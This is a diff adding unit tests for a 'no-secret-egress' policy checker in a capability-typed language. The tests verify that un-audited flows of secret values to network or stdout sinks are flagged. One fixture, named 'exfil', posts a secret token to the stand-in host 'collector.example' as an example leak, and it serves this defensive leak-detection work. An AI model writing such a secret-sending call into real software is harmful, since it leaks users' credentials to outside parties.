@@ -70,6 +70,7 @@ def _compose(root_dir: Path, root_file: str):
         raise AssertionError(f"analyzer errors: {result.errors}")
     manifest = build_manifest(
         linked.module, filename=filename, expr_labels=result.expr_labels,
+        unaudited_secret_sinks=result.unaudited_secret_sinks,
     )
     return build_composed_sbom(linked.module, manifest, root_dir)
 
@@ -1241,6 +1242,183 @@ class TestNoSecretEgress(_TmpTree):
         )
         report, _ = _eval(root, "main.capa")
         self.assertTrue(_result(report, "nse")["pass"])
+
+
+# A raw @secret value reaching an egress sink with NO declassify: the
+# un-audited leak the WARN-tier IFC check surfaces (feature #6, B1).
+_RAW_LEAK_NET = (
+    "pub fun exfil(token: @secret String, net: Net) -> Unit\n"
+    "    net.post(\"http://collector.example\", token)\n"
+    "    return\n"
+)
+# The same raw leak, but to Stdio rather than Net.
+_RAW_LEAK_STDIO = (
+    "pub fun exfil(token: @secret String, stdio: Stdio) -> Unit\n"
+    "    stdio.println(token)\n"
+    "    return\n"
+)
+
+
+class TestNoSecretEgressUnaudited(_TmpTree):
+    """Feature #6 (B1): ``no-secret-egress`` now also catches an UN-AUDITED
+    raw @secret -> egress-sink flow (no declassify), not only the audited
+    declassify+egress co-residence."""
+
+    def _tree(self, main_src: str, policy: str) -> Path:
+        root = self.tmp / "app"
+        _write(root, "capa.toml", '[package]\nname = "app"\nversion = "0.1.0"\n')
+        _write(root, "main.capa", main_src)
+        _write(root, "capa-policy.toml", policy)
+        return root
+
+    def test_raw_leak_to_declared_egress_violation(self):
+        # AC1: a raw secret->Net.post with NO declassify FIRES (it used to
+        # pass, since the flow is only a warning by default).
+        root = self._tree(
+            _RAW_LEAK_NET,
+            '[[policy]]\nid = "nse"\nkind = "no-secret-egress"\n'
+            'capabilities = ["Net"]\n',
+        )
+        report, composed = _eval(root, "main.capa")
+        r = _result(report, "nse")
+        self.assertFalse(r["pass"])
+        v = r["violations"][0]
+        self.assertEqual(v["verdict"], "violation")
+        self.assertEqual(v["package"], "app")
+        self.assertIn("UN-AUDITED", v["detail"])
+        self.assertIn("Net", v["detail"])
+        # The composed SBOM carries the per-package leak set + evidence.
+        pkg = next(p for p in composed["packages"] if p["name"] == "app")
+        self.assertEqual(
+            pkg["unaudited_secret_sink_capabilities"], ["Net"],
+        )
+        self.assertEqual(len(pkg["attributed_unaudited_secret_sinks"]), 1)
+        ev = pkg["attributed_unaudited_secret_sinks"][0]
+        self.assertEqual(ev["capability"], "Net")
+        self.assertIn("main.capa", ev["pos"])
+
+    def test_raw_leak_to_other_sink_discriminates(self):
+        # AC2: the same leak but to Stdio, with the policy declaring only
+        # Net, does NOT fire (Stdio is not a declared egress).
+        root = self._tree(
+            _RAW_LEAK_STDIO,
+            '[[policy]]\nid = "nse"\nkind = "no-secret-egress"\n'
+            'capabilities = ["Net"]\n',
+        )
+        report, composed = _eval(root, "main.capa")
+        self.assertTrue(_result(report, "nse")["pass"])
+        # The leak IS recorded (to Stdio); it simply is not a declared egress.
+        pkg = next(p for p in composed["packages"] if p["name"] == "app")
+        self.assertEqual(
+            pkg["unaudited_secret_sink_capabilities"], ["Stdio"],
+        )
+
+    def test_raw_leak_to_stdio_fires_when_stdio_is_egress(self):
+        # Declaring Stdio as the egress set makes the same Stdio leak fire:
+        # the egress vocabulary is author-declared, and the leak is tagged
+        # with the concrete capability reached.
+        root = self._tree(
+            _RAW_LEAK_STDIO,
+            '[[policy]]\nid = "nse"\nkind = "no-secret-egress"\n'
+            'capabilities = ["Stdio"]\n',
+        )
+        report, _ = _eval(root, "main.capa")
+        r = _result(report, "nse")
+        self.assertFalse(r["pass"])
+        self.assertIn("Stdio", r["violations"][0]["detail"])
+
+    def test_declassified_flow_is_not_an_unaudited_leak(self):
+        # A declassified value is PUBLIC and never reaches the sink as
+        # secret, so it is NOT recorded as an un-audited leak. The audited
+        # co-residence mode still fires (declassify + Net in one package),
+        # but the un-audited raw mode must NOT.
+        both = (
+            "pub fun leak(token: @secret String, _net: Net, "
+            "stdio: Stdio) -> Unit\n"
+            "    stdio.println(declassify(token, reason: \"send\"))\n"
+            "    return\n"
+        )
+        root = self._tree(
+            both,
+            '[[policy]]\nid = "nse"\nkind = "no-secret-egress"\n'
+            'capabilities = ["Net"]\n',
+        )
+        report, composed = _eval(root, "main.capa")
+        r = _result(report, "nse")
+        self.assertFalse(r["pass"])
+        # Exactly one violation, and it is the AUDITED co-residence mode.
+        self.assertEqual(len(r["violations"]), 1)
+        self.assertIn("declassifies secret data", r["violations"][0]["detail"])
+        pkg = next(p for p in composed["packages"] if p["name"] == "app")
+        self.assertEqual(pkg["unaudited_secret_sink_capabilities"], [])
+
+    # A callee two of whose parameters reach DIFFERENT sinks (``a`` -> Net,
+    # ``b`` -> Fs). A secret routed to the Net-param must be tagged Net only,
+    # never the sibling Fs-param's capability -- so an Fs-declaring policy
+    # PASSES and a Net-declaring policy FIRES. This is the per-parameter
+    # precision fix (the whole-callable union fabricated Fs here).
+    _TWO_SINK_ROUTED_TO_NET = (
+        "fun h(a: String, b: String, net: Net, fs: Fs) -> Unit\n"
+        "    net.post(\"u\", a)\n"
+        "    fs.write(\"p\", b)\n"
+        "    return\n"
+        "pub fun c(token: @secret String, pub2: String, "
+        "net: Net, fs: Fs) -> Unit\n"
+        "    h(token, pub2, net, fs)\n"
+        "    return\n"
+    )
+
+    def test_two_sink_callee_secret_to_net_param_not_tagged_fs(self):
+        # Fs-declaring policy PASSES: the secret reaches only Net.
+        root = self._tree(
+            self._TWO_SINK_ROUTED_TO_NET,
+            '[[policy]]\nid = "nse"\nkind = "no-secret-egress"\n'
+            'capabilities = ["Fs"]\n',
+        )
+        report, composed = _eval(root, "main.capa")
+        self.assertTrue(_result(report, "nse")["pass"])
+        pkg = next(p for p in composed["packages"] if p["name"] == "app")
+        self.assertEqual(
+            pkg["unaudited_secret_sink_capabilities"], ["Net"],
+        )
+
+    def test_two_sink_callee_secret_to_net_param_fires_on_net(self):
+        # Net-declaring policy still FIRES: the routed secret does reach Net.
+        root = self._tree(
+            self._TWO_SINK_ROUTED_TO_NET,
+            '[[policy]]\nid = "nse"\nkind = "no-secret-egress"\n'
+            'capabilities = ["Net"]\n',
+        )
+        report, _ = _eval(root, "main.capa")
+        r = _result(report, "nse")
+        self.assertFalse(r["pass"])
+        self.assertIn("Net", r["violations"][0]["detail"])
+
+    def test_cross_function_raw_leak_attributed_to_caller(self):
+        # A secret routed through a helper that sinks it to Net is recorded
+        # against the CALLER (the function at the warn site), tagged with the
+        # callee's sink capability. Single package -> fires.
+        src = (
+            "fun helper(s: String, net: Net) -> Unit\n"
+            "    net.post(\"u\", s)\n"
+            "    return\n"
+            "pub fun caller(token: @secret String, net: Net) -> Unit\n"
+            "    helper(token, net)\n"
+            "    return\n"
+        )
+        root = self._tree(
+            src,
+            '[[policy]]\nid = "nse"\nkind = "no-secret-egress"\n'
+            'capabilities = ["Net"]\n',
+        )
+        report, composed = _eval(root, "main.capa")
+        r = _result(report, "nse")
+        self.assertFalse(r["pass"])
+        self.assertIn("UN-AUDITED", r["violations"][0]["detail"])
+        pkg = next(p for p in composed["packages"] if p["name"] == "app")
+        self.assertEqual(
+            pkg["unaudited_secret_sink_capabilities"], ["Net"],
+        )
 
 
 if __name__ == "__main__":
